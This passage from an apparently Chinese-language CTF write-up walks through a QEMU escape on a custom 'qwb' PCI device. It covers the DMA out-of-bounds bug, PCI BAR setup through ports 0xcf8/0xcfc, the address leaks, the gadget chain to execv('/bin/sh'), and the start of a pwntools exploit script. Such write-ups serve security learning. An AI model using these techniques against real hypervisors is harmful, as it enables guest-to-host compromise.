class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">qwb_do_dma</span><span class="params">(QWBState_0 *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD idx; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  _QWORD idxa; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  opaque-&gt;dma_using = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( idx = <span class="number">0L</span>L; idx &lt; opaque-&gt;dma_info_size; ++idx )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( opaque-&gt;dma_info[idx].cmd )            <span class="comment">// device -&gt; address_space</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;dma_info[idx].src + opaque-&gt;dma_info[idx].cnt &gt; <span class="number">0x1000</span> || opaque-&gt;dma_info[idx].cnt &gt; <span class="number">0x1000</span> )</span><br><span class="line">        <span class="keyword">goto</span> end;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( opaque-&gt;dma_info[idx].dst + opaque-&gt;dma_info[idx].cnt &gt; <span class="number">0x1000</span> || opaque-&gt;dma_info[idx].cnt &gt; <span class="number">0x1000</span> )</span><br><span class="line">    &#123;                                           <span class="comment">// address_space -&gt; device</span></span><br><span class="line">      <span class="keyword">goto</span> end;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( idxa = <span class="number">0L</span>L; idxa &lt; opaque-&gt;dma_info_size; ++idxa )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( opaque-&gt;dma_info[idxa].cmd )</span><br><span class="line">      pci_dma_write_3(                          <span class="comment">// device -&gt; address_space</span></span><br><span class="line">        &amp;opaque-&gt;pdev,</span><br><span class="line">        opaque-&gt;dma_info[idxa].dst,</span><br><span class="line">        &amp;opaque-&gt;dma_buf[opaque-&gt;dma_info[idxa].src],</span><br><span class="line">        opaque-&gt;dma_info[idxa].cnt);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      pci_dma_read_3(</span><br><span class="line">        &amp;opaque-&gt;pdev,                          <span class="comment">// address_space -&gt; device</span></span><br><span class="line">        opaque-&gt;dma_info[idxa].src,</span><br><span class="line">        &amp;opaque-&gt;dma_buf[opaque-&gt;dma_info[idxa].dst],</span><br><span class="line">        opaque-&gt;dma_info[idxa].cnt);</span><br><span class="line">  &#125;</span><br><span class="line">end:</span><br><span class="line">  opaque-&gt;dma_using = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>例如我们可以将idx=0的dma_info设置为：<code>{ src = 0x40000, dst = -0x20, cnt = 0x20, cmd = 1 }</code> 并且在虚拟机<code>0x40000</code>地址上布局好一个越界读写的dma_info, 这里可以随意填写src和cnt构造任意读：<code>{ src = -0x2000, dst = 0x41000, cnt = 0x1000, cmd = 0 }</code>任意写也同理。这样在执行完idx=0的dma_info之后，idx=31的dma_info就会填上0x41000处布局好的dma_info。按照这样的原理可以进行任意地址读写操作。</p>
+<h2 id="DMA逻辑"><a href="#DMA逻辑" class="headerlink" title="DMA逻辑"></a>DMA逻辑</h2><p>为了方便读者理解题目DMA操作的逻辑，这里补充一张图。<br>首先我们可以通过qtest命令行对Guest的内存地址进行任意读写。在设备被正常初始化的情况下，Guest内存会分配出一段专门处理mmio的内存，通过对mmio段操作我们可以设置<code>QWBState</code>中的dma_info信息以及触发<code>qwb_do_dma</code>操作。<code>qwb_do_dma</code>是Guest和Host通信的管道，本意是提供对<code>dma_buf</code>区域内存的读写功能。但是由于上面提到的漏洞，我们可以实现对Host(<code>qemu-system-x86_64</code>进程)的任意地址读写，进而执行任意命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──────────────────────┐                  ┌──────────────────────┐</span><br><span class="line">│    Guest Address     │                  │  qemu-system-x86_64  │</span><br><span class="line">│                      │                  │                      │</span><br><span class="line">│                      │                  │                      │</span><br><span class="line">│                      │                  │                      │</span><br><span class="line">│                      │                  │                      │</span><br><span class="line">│                      │                  ├──────────────────────┤</span><br><span class="line">│                      │                  │        heap          │</span><br><span class="line">│                      │                  │                      │</span><br><span class="line">│                      │                  ├┬────────────────────┬┤</span><br><span class="line">│                      │                  ││      QWBState      ││</span><br><span class="line">├──────────────────────┤                  ││                    ││</span><br><span class="line">│       qwb-mmio       │                  │┼────────────────────┼│</span><br><span class="line">│                      │                  ││      dma_info      ││</span><br><span class="line">│                      │    qwb_do_dma    │┼────────────────────┼│</span><br><span class="line">│                      │◄────────────────►├│      dma_buf       ││</span><br><span class="line">├──────────────────────┤                  ├┴────────────────────┴┤</span><br><span class="line">│                      │                  │                      │</span><br><span class="line">│                      │                  ├──────────────────────┤</span><br><span class="line">│                      │                  │                      │</span><br><span class="line">│                      │                  │                      │</span><br><span class="line">└──────────────────────┘                  └──────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<h2 id="PCI设备初始化"><a href="#PCI设备初始化" class="headerlink" title="PCI设备初始化"></a>PCI设备初始化</h2><p>理清楚题目的目标和运行逻辑以后，接下来最重要的问题就是找到mmio的地址。<br>之前QEMU逃逸类型的题目都是在Linux系统下进行操作，mmio可以通过类似<code>/sys/devices/pci0000:00/0000:00:04.0/resource1</code>的路径来操作，但是在qtest命令行下要怎么操作呢。<br>第一个想法是以为mmio地址是qemu给我们分配好的，我们只需要通过命令找到正确的地址即可。于是我查找到了关于qemu monitor的用法，将launch.sh修改为：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64  -display  none -machine  accel=qtest -m  512M -device  qwb -nodefaults -monitor telnet:127.0.0.1:4444,server,nowait -qtest  stdio</span><br></pre></td></tr></table></figure>
+
+<p>这样qemu启动以后会开启4444端口到monitor，我们可以用nc连接上4444端口对qemu进行管理操作。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@matthew-Virtual-Machine:/pwn# nc 127.0.0.1 4444</span><br><span class="line">QEMU 6.0.50 monitor - type 'help' for more information</span><br><span class="line">(qemu) info pci</span><br><span class="line">info pci</span><br><span class="line">  Bus  0, device   0, function 0:</span><br><span class="line">    Host bridge: PCI device 8086:1237</span><br><span class="line">      PCI subsystem 1af4:1100</span><br><span class="line">      id ""</span><br><span class="line">  Bus  0, device   1, function 0:</span><br><span class="line">    ISA bridge: PCI device 8086:7000</span><br><span class="line">      PCI subsystem 1af4:1100</span><br><span class="line">      id ""</span><br><span class="line">  Bus  0, device   1, function 1:</span><br><span class="line">    IDE controller: PCI device 8086:7010</span><br><span class="line">      PCI subsystem 1af4:1100</span><br><span class="line">      BAR4: I/O at 0xffffffffffffffff [0x000e].</span><br><span class="line">      id ""</span><br><span class="line">  Bus  0, device   1, function 3:</span><br><span class="line">    Bridge: PCI device 8086:7113</span><br><span class="line">      PCI subsystem 1af4:1100</span><br><span class="line">      IRQ 0, pin A</span><br><span class="line">      id ""</span><br><span class="line">  Bus  0, device   2, function 0:</span><br><span class="line">    Class 0255: PCI device 2021:0612</span><br><span class="line">      PCI subsystem 1af4:1100</span><br><span class="line">      BAR0: 32 bit memory at 0xffffffffffffffff [0x000ffffe].</span><br><span class="line">      id ""</span><br></pre></td></tr></table></figure>
+
+<p>可以看到device对应的应该就是qwb设备（观察device id可知），但是这里看不出来我们想要的mmio地址是什么；还可以试试<code>info qtree</code>命令。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">(qemu) info qtree</span><br><span class="line">info qtree</span><br><span class="line">bus: main-system-bus</span><br><span class="line">  type System</span><br><span class="line">  dev: hpet, id ""</span><br><span class="line">    gpio-in "" 2</span><br><span class="line">    gpio-out "" 1</span><br><span class="line">    gpio-out "sysbus-irq" 32</span><br><span class="line">    timers = 3 (0x3)</span><br><span class="line">    msi = false</span><br><span class="line">    hpet-intcap = 4 (0x4)</span><br><span class="line">    hpet-offset-saved = true</span><br><span class="line">    mmio 00000000fed00000/0000000000000400</span><br><span class="line">  dev: ioapic, id ""</span><br><span class="line">    gpio-in "" 24</span><br><span class="line">    version = 32 (0x20)</span><br><span class="line">    mmio 00000000fec00000/0000000000001000</span><br><span class="line">  dev: i440FX-pcihost, id ""</span><br><span class="line">    pci-hole64-size = 2147483648 (2 GiB)</span><br><span class="line">    short_root_bus = 0 (0x0)</span><br><span class="line">    x-pci-hole64-fix = true</span><br><span class="line">    x-config-reg-migration-enabled = true</span><br><span class="line">    bus: pci.0</span><br><span class="line">      type PCI</span><br><span class="line">      dev: qwb, id ""</span><br><span class="line">        addr = 02.0</span><br><span class="line">        romfile = ""</span><br><span class="line">        romsize = 4294967295 (0xffffffff)</span><br><span class="line">        rombar = 1 (0x1)</span><br><span class="line">        multifunction = false</span><br><span class="line">        x-pcie-lnksta-dllla = true</span><br><span class="line">        x-pcie-extcap-init = true</span><br><span class="line">        failover_pair_id = ""</span><br><span class="line">        acpi-index = 0 (0x0)</span><br><span class="line">        class Class 00ff, addr 00:02.0, pci id 2021:0612 (sub 1af4:1100)</span><br><span class="line">        bar 0: mem at 0xffffffffffffffff [0xffffe]</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure>
+
+<p>这里直接列出了设备的名字“qwb”，但是还是没有找到mmio地址，尝试向<code>0xffffe</code>附近进行读写操作也无法触发mmio操作。<br>后来找到了一篇非常重要的文档 <a href="https://github.com/GiantVM/doc/blob/master/pci.md" target="_blank" rel="noopener">https://github.com/GiantVM/doc/blob/master/pci.md</a>。根据文档中总结，初始化PCI设备有以下流程：</p>
+<blockquote>
+<ol>
+<li>在 do_pci_register_device 中分配内存，对config内容进行设置，如 pci_config_set_vendor_id</li>
+<li>在 pci_e1000_realize 中继续设置config，包括 pci_register_bar 中将BAR base address设置为全f</li>
+<li>由于有ROM(efi-e1000.rom)，于是调用 pci_add_option_rom ，注册 PCI_ROM_SLOT 为BAR6</li>
+<li>pci_do_device_reset (调用链前面提过) 进行清理和设置</li>
+<li>KVM_EXIT_IO QEMU =&gt; KVM =&gt; VM 后，当VM运行port I/O指令访问config信息时，发生VMExit，VM =&gt; KVM =&gt; QEMU，QEMU根据 exit_reason 得知原因是 KVM_EXIT_IO ，于是从 cpu-&gt;kvm_run 中取出 io 信息，最终调用pci_default_read_config</li>
+<li>设置完config后，在Linux完成了了对设备的初始化后，就可以进行通信了。当VM对映射的内存区域进行访问时，发生VMExit，VM =&gt; KVM =&gt; QEMU，QEMU根据 exit_reason 得知原因是 KVM_EXIT_MMIO ，于是从 cpu-&gt;kvm_run 中取出 mmio 信息，最终调用e1000_mmio_write</li>
+</ol>
+</blockquote>
+<p>根据这个流程，结合断点调试，看来我们的qemu启动只进行到了第4步。要正确完成设备配置还得往BAR写MMIO的地址。文档中还提到q35设备将CONFIG读写操作绑定到了0xcf8和0xcfc的端口。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MCH_HOST_BRIDGE_CONFIG_ADDR            0xcf8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MCH_HOST_BRIDGE_CONFIG_DATA            0xcfc</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">q35_host_realize</span><span class="params">(DeviceState *dev, Error **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    sysbus_add_io(sbd, MCH_HOST_BRIDGE_CONFIG_ADDR, &amp;pci-&gt;conf_mem);</span><br><span class="line">    sysbus_init_ioports(sbd, MCH_HOST_BRIDGE_CONFIG_ADDR, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    sysbus_add_io(sbd, MCH_HOST_BRIDGE_CONFIG_DATA, &amp;pci-&gt;data_mem);</span><br><span class="line">    sysbus_init_ioports(sbd, MCH_HOST_BRIDGE_CONFIG_DATA, <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在另一份文档：<a href="https://blog.csdn.net/weixin_43780260/article/details/104410063" target="_blank" rel="noopener">QEMU如何虚拟PCI设备
+</a>中也提到了i440fx的类似操作：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">i440fx_pcihost_realize</span><span class="params">(DeviceState *dev, Error **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">..</span><br><span class="line">    sysbus_add_io(sbd, <span class="number">0xcf8</span>, &amp;s-&gt;conf_mem);</span><br><span class="line">    sysbus_init_ioports(sbd, <span class="number">0xcf8</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    sysbus_add_io(sbd, <span class="number">0xcfc</span>, &amp;s-&gt;data_mem);</span><br><span class="line">    sysbus_init_ioports(sbd, <span class="number">0xcfc</span>, <span class="number">4</span>);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是在我们的qwb设备中并没有进行绑定端口的操作，那要如何对BAR进行配置呢？到比赛结束时我仍卡在这个问题，始终无法找到mmio地址。<br>比赛后第二天，我静下心来重新阅读上面的参考文档，终于理解了初始化逻辑。我们的qwb其实是挂在i440fx-pcihost下面的设备，从info qtree里面可以观察到，这里是一个类似于子类的概念。设备初始化阶段会沿用父类i44fx绑定的端口，其实从第一份文档中的q35机器和e1000网卡关系类别一下这里的i44fx和qwb设备的关系就容易理解了。</p>
+<p>总结一下初始化需要操作的步骤：</p>
+<ol>
+<li>将MMIO地址写入qwb设备的BAR0地址</li>
+</ol>
+<ul>
+<li>通过0xcf8端口设置目标地址</li>
+<li>通过0xcfc端口写值</li>
+</ul>
+<ol start="2">
+<li>将命令写入qwb设备的COMMAND地址，触发pci_update_mappings</li>
+</ol>
+<ul>
+<li>通过0xcf8端口设置目标地址</li>
+<li>通过0xcfc端口写值</li>
+</ul>
+<p>首先我们需要知道qwb设备的地址，根据文档二中的图，我们qwb设备的Bus number为0，Device number为2，Function number为0，得出qwb的地址为<code>0x80001000</code>。<br><img src="https://i.loli.net/2021/06/15/4HeUZ67czkb9VGl.png" alt="device_addrss.png"><span class="image-caption">device_addrss.png</span><br>再结合设备中寄存器映射图，可以看到BAR0的偏移为0x10，COMMAND的偏移为4。<br><img src="https://i.loli.net/2021/06/15/wN1TRIKfUQYEoub.png" alt="register_map"><span class="image-caption">register_map</span><br>然后我们需要解决写什么值的问题。MMIO地址我们可以直接拿文档一中的地址<code>0xfebc0000</code>。而COMMAND值的设置就另有说法了，文档二中给出了COMMAND的比特位定义：<br><img src="https://i.loli.net/2021/06/15/GcODnj5Ietxbd2m.png" alt="command.png"><span class="image-caption">command.png</span><br>而两份文档的说法都是选择<code>0x103</code>，即设置SERR，Memory space和IO space。然而实际发现要把bit 2也设置上才能正确使用dma，所以最后需要写入的COMMAND为<code>0x107</code>。</p>
+<p>所以最后初始化阶段需要执行的命令如下：</p>
+<ol>
+<li><code>outl 0xcf8 0x80001010</code></li>
+<li><code>outl 0xcfc 0xfebc0000</code></li>
+<li><code>outl 0xcf8 0x80001004</code></li>
+<li><code>outw 0xcfc 0x107</code></li>
+</ol>
+<p>执行上述命令之后观察pci设备可以看到BAR0已经设置上了<code>0xfeb00000</code>，对该地址进行读写能正确触发MMIO handler的断点。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(qemu) info pci</span><br><span class="line">info pci</span><br><span class="line">...</span><br><span class="line">  Bus  0, device   2, function 0:</span><br><span class="line">    Class 0255: PCI device 2021:0612</span><br><span class="line">      PCI subsystem 1af4:1100</span><br><span class="line">      BAR0: 32 bit memory at 0xfeb00000 [0xfebfffff].</span><br><span class="line">      id &quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>解决MMIO地址问题以后就可以通过DMA操作对qemu内存进行任意地址读写了，具体方法上面已经介绍过。Exploit流程如下：</p>
+<ol>
+<li>在<code>QWBState-&gt;pdev</code>中泄露CODE段地址和QWBState地址</li>
+<li>通过读GOT表泄露libc地址</li>
+<li>往<code>QWBState+0x460</code>写入gadget地址，覆盖<code>pci_default_read_config</code>指针</li>
+<li><code>inw 3324</code>操作触发read config动作，控pc跳到gadget。</li>
+</ol>
+<p>控PC之后如何get shell又是一个令人头大的问题，这里想了很多方法。</p>
+<h3 id="Plan-A"><a href="#Plan-A" class="headerlink" title="Plan A"></a>Plan A</h3><p>Plan A是直接将<code>QWBState+0x460</code>写入<code>system@plt</code>地址，然后<code>QWBState+0</code>写入<code>/bin/sh</code>地址，改写掉<code>QWBState+0</code>指针后，执行read config操作时无法找到bus导致流程中断。</p>
+<h3 id="Plan-B"><a href="#Plan-B" class="headerlink" title="Plan B"></a>Plan B</h3><p>Plan B是找一个gadget能够通过<code>[rax+off]</code>或<code>[rdi+off]</code>设置好rdi，然后call一个可控指针，在libc中找到以下的gadget。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x000000001628e5</span>: mov rdi, [rdi+<span class="number">0x8</span>]; push <span class="number">0x0</span>; lea rcx, [rsi+<span class="number">0x398</span>]; push <span class="number">0x0</span>; call qword ptr [rax+<span class="number">0x1e0</span>];</span><br></pre></td></tr></table></figure>
+
+<p>这里将<code>QWBState+8</code>设置为<code>/bin/sh</code>地址，将<code>QWBState+0x1e0</code>设置为<code>system@plt</code>地址，将<code>QWBState+0x460</code>写入这条<code>libc+0x1628e5</code>gadget。<br>如此可以正确触发<code>system(&quot;/bin/sh&quot;)</code>，问题是调用之后再system流程里面还是报错，卡在<code>movaps xmmword ptr [rsp+0x50],xmm0</code>的地方。如果是rop的话可以通过添加一条<code>ret</code>改变rsp地址来解决问题，但是这里没法改变rsp地址，好像也找不到类似的gadget。</p>
+<h3 id="Plan-C"><a href="#Plan-C" class="headerlink" title="Plan C"></a>Plan C</h3><p>利用setcontext gadget。但是libc 2.31版本setcontext改成了rdx来布局，从函数头部来做gadget也是会报错。</p>
+<h3 id="Plan-D"><a href="#Plan-D" class="headerlink" title="Plan D"></a>Plan D</h3><p>在qemu-system-x86_64里面找到一条有意思的gadget: <code>0x3d2f05：lea rdi, &quot;/bin/sh&quot;; call execv</code>。<br>配合libc里面的另一条gadget把可以把rsi设置为0：<code>0x0000000014bd1e: mov rsi, [rbx+0x10]; mov rdx, r12; mov rdi, r14; call qword ptr [rax+0x20]; </code><br>用这两条gadget能够调用<code>execv(&quot;/bin/sh&quot;, 0)</code>，成功get shell了。</p>
+<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">env = &#123;<span class="string">'LD_PRELOAD'</span>: <span class="string">''</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./qemu-system-x86_64  -display  none -machine  accel=qtest -m  512M -device  qwb -nodefaults -monitor  telnet:127.0.0.1:5555,server,nowait -qtest  stdio'</span>.split())</span><br><span class="line">    <span class="comment"># p = gdb.debug('./qemu-system-x86_64  -display  none -machine  accel=qtest -m  512M -device  qwb -nodefaults -monitor  none -qtest  stdio'.split())</span></span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">    p = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line">BASE = <span class="number">0xfebc0000</span></span><br><span class="line"><span class="comment"># write BAR0</span></span><br><span class="line">sl(<span class="string">"outl 3320 &#123;&#125;"</span>.format(<span class="number">0x80001000</span> + <span class="number">0x10</span>))</span><br><span class="line">sl(<span class="string">"outl 3324 &#123;&#125;"</span>.format(BASE))</span><br><span class="line"><span class="comment"># write commmand update</span></span><br><span class="line">sl(<span class="string">"outl 3320 &#123;&#125;"</span>.format(<span class="number">0x80001000</span> + <span class="number">4</span>))</span><br><span class="line">sl(<span class="string">"outw 3324 &#123;&#125;"</span>.format(<span class="number">0x107</span>)) <span class="comment"># 0x103 failed</span></span><br><span class="line"></span><br><span class="line">BASE = <span class="number">0xfeb00000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_size</span><span class="params">(sz)</span>:</span></span><br><span class="line">    sl(<span class="string">"writeq &#123;&#125; &#123;&#125;"</span>.format(BASE, sz))</span><br><span class="line">    ru(<span class="string">"OK"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_size</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">"readq &#123;&#125;"</span>.format(BASE))</span><br><span class="line">    ru(<span class="string">"OK"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_idx</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">"writeq &#123;&#125; &#123;&#125;"</span>.format(BASE+<span class="number">8</span>, idx))</span><br><span class="line">    ru(<span 